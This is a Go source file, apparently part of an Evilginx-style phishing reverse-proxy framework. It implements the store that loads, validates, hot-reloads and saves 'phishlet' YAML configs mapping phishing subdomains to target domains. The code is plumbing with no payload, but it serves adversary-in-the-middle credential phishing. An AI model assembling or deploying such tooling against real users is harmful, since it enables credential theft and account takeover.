// Package phishlet — PhishletStore impl (specs/phishlet-v2.md).
package phishlet

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"

	"github.com/phantom-v2/phantom/core"
	"gopkg.in/yaml.v3"
)

type Store struct {
	mu     sync.RWMutex
	byID   map[string]*core.Phishlet
	byHost map[string]*entry // "login.example.com" -> phishlet+host
	dir    string            // запомненный LoadDir (для Save)
	src    map[string]string // id -> исходный файл (чтобы Save не плодил дубли)
}

type entry struct {
	ph *core.Phishlet
	h  *core.ProxyHost
}

func NewStore() *Store {
	return &Store{byID: map[string]*core.Phishlet{}, byHost: map[string]*entry{}, src: map[string]string{}}
}

func (s *Store) LoadDir(dir string) error {
	fresh, err := loadDir(dir)
	if err != nil {
		return err
	}
	s.mu.Lock()
	s.byID = fresh.byID
	s.byHost = fresh.byHost
	s.dir = dir
	s.src = fresh.src
	s.mu.Unlock()
	return nil
}

// Reload перечитывает директорию атомарно: при ошибке живой стор не тронут.
func (s *Store) Reload(dir string) error { return s.LoadDir(dir) }

// Validate экспортирует валидацию спека (генератор, API).
func Validate(p *core.Phishlet) error { return validate(p) }

// UpsertYAML парсит один YAML, валидирует и вставляет/заменяет по ID
// (старые host-ключи этого ID чистятся). Без рестарта.
func (s *Store) UpsertYAML(data []byte) (*core.Phishlet, error) {
	var p core.Phishlet
	if err := yaml.Unmarshal(data, &p); err != nil {
		return nil, err
	}
	if err := validate(&p); err != nil {
		return nil, err
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	// Сначала проверяем конфликты, только потом мутируем (атомарность).
	newKeys := make([]string, 0, len(p.ProxyHosts)*len(p.BaseDomains))
	for i := range p.ProxyHosts {
		for _, d := range p.BaseDomains {
			key := strings.ToLower(p.ProxyHosts[i].PhishSub + "." + d)
			if dup, taken := s.byHost[key]; taken && dup.ph.ID != p.ID {
				return nil, fmt.Errorf("proxy host %q taken by %q", key, dup.ph.ID)
			}
			newKeys = append(newKeys, key)
		}
	}
	if old, ok := s.byID[p.ID]; ok {
		for _, h := range old.ProxyHosts {
			for _, d := range old.BaseDomains {
				delete(s.byHost, strings.ToLower(h.PhishSub+"."+d))
			}
		}
	}
	cp := p
	s.byID[p.ID] = &cp
	ki := 0
	for i := range cp.ProxyHosts {
		h := &cp.ProxyHosts[i]
		for range cp.BaseDomains {
			s.byHost[newKeys[ki]] = &entry{ph: s.byID[p.ID], h: h}
			ki++
		}
	}
	return s.byID[p.ID], nil
}

// loadDir парсит все YAML в отдельный стор (для атомарного swap).
func loadDir(dir string) (*Store, error) {
	fresh := NewStore()
	files, err := filepath.Glob(filepath.Join(dir, "*.yaml"))
	if err != nil {
		return nil, err
	}
	for _, f := range files {
		b, err := os.ReadFile(f)
		if err != nil {
			return nil, fmt.Errorf("%s: %w", f, err)
		}
		var p core.Phishlet
		if err := yaml.Unmarshal(b, &p); err != nil {
			return nil, fmt.Errorf("%s: %w", f, err)
		}
		if err := validate(&p); err != nil {
			return nil, fmt.Errorf("%s: %w", f, err)
		}
		if _, dup := fresh.byID[p.ID]; dup {
			return nil, fmt.Errorf("%s: duplicate id %q", f, p.ID)
		}
		fresh.byID[p.ID] = &p
		fresh.src[p.ID] = f
		for i := range p.ProxyHosts {
			h := &p.ProxyHosts[i]
			for _, d := range p.BaseDomains {
				key := strings.ToLower(h.PhishSub + "." + d)
				if _, dup := fresh.byHost[key]; dup {
					return nil, fmt.Errorf("%s: duplicate proxy host %q", f, key)
				}
				fresh.byHost[key] = &entry{ph: fresh.byID[p.ID], h: h}
			}
		}
	}
	return fresh, nil
}

func validate(p *core.Phishlet) error {
	if p.ID == "" || strings.Contains(p.ID, " ") {
		return fmt.Errorf("id required")
	}
	if p.Version != 2 {
		return fmt.Errorf("version must be 2")
	}
	if len(p.BaseDomains) == 0 || len(p.ProxyHosts) == 0 {
		return fmt.Errorf("base_domains and proxy_hosts required")
	}
	for i := range p.SubFilters {
		f := &p.SubFilters[i]
		if f.Search == "" || (!f.Regex && f.Search == f.Replace) {
			return fmt.Errorf("sub_filters: bad search/replace")
		}
		if f.Regex {
			re, err := regexp.Compile(f.Search)
			if err != nil {
				return fmt.Errorf("sub_filters: bad regex %q: %w", f.Search, err)
			}
			f.Compiled = re
		}
	}
	if p.RedirectURL != "" && !strings.HasPrefix(p.RedirectURL, "https://") && !strings.HasPrefix(p.RedirectURL, "http://") {
		return fmt.Errorf("redirect_url must be http(s)")
	}
	for _, fr := range p.ForcePost {
		if fr.Key == "" {
			return fmt.Errorf("force_post: key required")
		}
		if fr.Ctype != "form" && fr.Ctype != "json" {
			return fmt.Errorf("force_post: ctype must be form|json")
		}
	}
	return nil
}

// SetDomains меняет base_domains фишлета на лету (как `phishlets hostname`
// в Evilginx): чистит старые host-ключи, проверяет конфликты, переиндексирует.
func (s *Store) SetDomains(id string, domains []string) error {
	if len(domains) == 0 {
		return fmt.Errorf("domains: at least 1 required")
	}
	for _, d := range domains {
		d = strings.TrimSpace(strings.ToLower(d))
		if !strings.Contains(d, ".") || strings.ContainsAny(d, " \t/") {
			return fmt.Errorf("domains: invalid %q", d)
		}
	}
	for i := range domains {
		domains[i] = strings.TrimSpace(strings.ToLower(domains[i]))
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	p, ok := s.byID[id]
	if !ok {
		return fmt.Errorf("unknown phishlet %q", id)
	}
	// Конфликты с чужими ID заранее.
	for i := range p.ProxyHosts {
		for _, d := range domains {
			key := strings.ToLower(p.ProxyHosts[i].PhishSub + "." + d)
			if dup, taken := s.byHost[key]; taken && dup.ph.ID != id {
				return fmt.Errorf("proxy host %q taken by %q", key, dup.ph.ID)
			}
		}
	}
	for _, h := range p.ProxyHosts {
		for _, d := range p.BaseDomains {
			delete(s.byHost, strings.ToLower(h.PhishSub+"."+d))
		}
	}
	p.BaseDomains = append([]string(nil), domains...)
	for i := range p.ProxyHosts {
		h := &p.ProxyHosts[i]
		for _, d := range p.BaseDomains {
			s.byHost[strings.ToLower(h.PhishSub+"."+d)] = &entry{ph: p, h: h}
		}
	}
	return nil
}

// SetEnabled включает/выключает фишлет без рестарта.
func (s *Store) SetEnabled(id string, enabled bool) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	p, ok := s.byID[id]
	if !ok {
		return fmt.Errorf("unknown phishlet %q", id)
	}
	p.Enabled = enabled
	return nil
}

// Save пишет фишлет обратно в его исходный файл (или <dir>/<id>.yaml
// для runtime-добавлений) — персист runtime-правок без дублей.
func (s *Store) Save(id string) error {
	s.mu.RLock()
	p, ok := s.byID[id]
	dir := s.dir
	path := s.src[id]
	s.mu.RUnlock()
	if !ok {
		return fmt.Errorf("unknown phishlet %q", id)
	}
	if dir == "" {
		return fmt.Errorf("no dir (LoadDir not called)")
	}
	if path == "" {
		path = filepath.Join(dir, id+".yaml")
	}
	b, err := yaml.Marshal(p)
	if err != nil {
		return err
	}
	if err := os.WriteFile(path, b, 0o600); err != nil {
		return err
	}
	s.mu.Lock()
	s.src[id] = path
	s.mu.Unlock()
	return nil
}

func (s *Store) FindByHost(host string) (*core.Phishlet, *core.ProxyHost) {
	host = StripPort(host)
	host = strings.ToLower(host)
	s.mu.RLock()
	defer s.mu.RUnlock()
	if e, ok := s.byHost[host]; ok && e.ph.Enabled {
		return e.ph, e.h
	}
	return nil, nil
}

// StripPort корректно режет порт: hostname:port, [ipv6]:port и голый IPv6.
func StripPort(h string) string {
	h = strings.TrimSpace(h)
	if strings.HasPrefix(h, "[") {
		if host, _, err := net.SplitHostPort(h); err == nil {
			return host
		}
		return strings.Trim(h, "[]")
	}
	if host, _, err := net.SplitHostPort(h); err == nil {
		return host
	}
	// hostname:port без скобок (ровно одно двоеточие) — IPv6 без скобок не трогаем.
	if strings.Count(h, ":") == 1 {
		if i := strings.LastIndex(h, ":"); i > 0 {
			return h[:i]
		}
	}
	return h
}

func (s *Store) FindByID(id string) *core.Phishlet {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.byID[id]
}

func (s *Store) All() []*core.Phishlet {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*core.Phishlet, 0, len(s.byID))
	for _, p := range s.byID {
		out = append(out, p)
	}
	return out
}

func (s *Store) Count() int {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return len(s.byID)
}
